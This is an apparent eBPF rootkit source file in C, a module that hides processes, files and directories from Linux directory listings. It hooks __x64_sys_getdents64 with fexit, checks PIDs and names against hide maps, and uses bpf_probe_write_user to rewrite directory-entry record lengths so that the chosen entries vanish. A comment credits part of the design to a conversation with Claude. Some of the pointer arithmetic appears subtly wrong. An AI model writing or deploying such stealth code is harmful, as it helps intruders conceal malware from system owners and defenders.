/**
 * Main code logic for hiding processes.
 * 
 * @author Yekuuun
 */

#ifndef MOD_HIDE_FROM_H
#define MOD_HIDE_FROM_H

#include "../includes/bpf_config.h"
#include "../includes/bpf_utils.h"
#include "../lib/bpf_common.h"

//https://elixir.bootlin.com/linux/v6.17.3/source/include/linux/fs_types.h#L37
#ifndef DT_DIR
#define DT_DIR 4
#endif 

#define D_MAX_DEPTH      32

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  HIDE PROCESSES
// └────────────────────────────────────┘
//----------------------------------------------------

/**
 * Hook __x64_sys_getdents64. using Fexit to get current ctx + return code.
 * 
 * @note : long conv with Claude & research. consider using Kprobe & Kretprobe for same result.
 * Fexit only on linux kernel version > 5.5 & way more easier avoiding usage of cache to store kprobe data when hitting kretprobe.
 */
SEC("fexit/__x64_sys_getdents64")
int BPF_PROG(fexit_sysgetdents64, unsigned int fd, struct linux_dirent64 *dirent, unsigned int count, long ret) 
{
    //check comm / process to avoid ?
    if(!__is_target_bin())
        return 0;

    struct linux_dirent64 *base_addr = dirent; //__user space addr.
    long dir_buf_max  = ret;
    long curr_offset  = 0;

    struct linux_dirent64 *prev = (struct linux_dirent64*)(base_addr + curr_offset);

    #pragma unroll
    for(int i = 0; i < D_MAX_DEPTH; i++) {

        //has reached end.
        if(curr_offset >= dir_buf_max)
            break;

        struct linux_dirent64 *curr = (struct linux_dirent64*)(base_addr + curr_offset);
        unsigned short d_reclen;
        char d_type;
        char d_name[DNAME_MAX] = {0};

        //get d_reclen & d_type
        bpf_probe_read(&d_reclen, sizeof(unsigned short), &curr->d_reclen);
        bpf_probe_read(&d_type, sizeof(d_type), &curr->d_type);

        if(bpf_probe_read_user_str(&d_name, DNAME_MAX, curr->d_name) < 0){
            
            //err reading d_name => go to next.
            curr_offset += d_reclen;
            continue;
        }

        //is it a dir ?
        if(prev != NULL){
            __u8 *hidden = NULL;

            if(ft_isnumeric(d_name)){ //pid ?
                int pid = ft_atoi(d_name);
                hidden  = bpf_map_lookup_elem(&hide_pid_cache, &pid);
            }
            else {
                if (d_type == DT_DIR)
                    hidden = bpf_map_lookup_elem(&hide_from_cache_dir, &d_name);
                else
                    hidden = bpf_map_lookup_elem(&hide_from_cache_file, &d_name);
            }

            if(hidden && *hidden == 1){ //update.
                __u16 prev_reclen;
                bpf_probe_read(&prev_reclen, sizeof(__u16), &prev->d_reclen); 

                __u16 new_len = prev_reclen + d_reclen;

                //overwrite old rec_len to point to the next struct in memory when looping throught data.
                bpf_probe_write_user(&(prev->d_reclen), &new_len ,sizeof(__u16)); 
            }
        }
        
        
        //go to next.
        bpf_probe_read(&prev, sizeof(struct linux_dirent64*), &curr);
        curr_offset += d_reclen;
    }

    return 0;
}

//-----------------------------------------------------

#endif